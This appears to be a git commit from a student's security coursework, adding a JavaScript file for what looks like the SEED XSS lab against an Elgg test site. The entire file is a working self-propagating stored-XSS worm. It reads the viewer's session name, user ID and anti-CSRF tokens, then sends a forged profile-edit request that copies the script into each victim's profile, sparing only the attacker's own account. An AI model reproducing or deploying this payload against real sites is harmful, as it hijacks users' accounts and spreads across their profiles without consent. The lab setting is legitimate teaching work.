408fa8061f77f5d6ff6a332daf747ce87d46a2f4
Shannon <shannon.coupland42@gmail.com>
2020-12-09 00:42:53 -0500

    working on studio 9

---
+++ studio_9/task6.js
@@ -0,0 +1,28 @@
+<script id=worm>
+window.onload = function(){
+//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+//and Security Token __elgg_token
+var userName=elgg.session.user.name;
+var guid="&guid="+elgg.session.user.guid;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+//Construct the content of your url.
+var content=token+ts+"&name="+userName+"&description=<script id=\"worm\">"+document.getElementById("worm").innerHTML+"</script>&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2"+guid;
+
+var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
+
+var charlieGuid=46; //FILL IN
+if(elgg.session.user.guid!=charlieGuid)
+{
+//Create and send Ajax request to modify profile
+var Ajax=null;
+Ajax=new XMLHttpRequest();
+Ajax.open("POST",sendurl,true);
+Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax.setRequestHeader("Content-Type",
+"application/x-www-form-urlencoded");
+Ajax.send(content);
+}
+}
+</script>
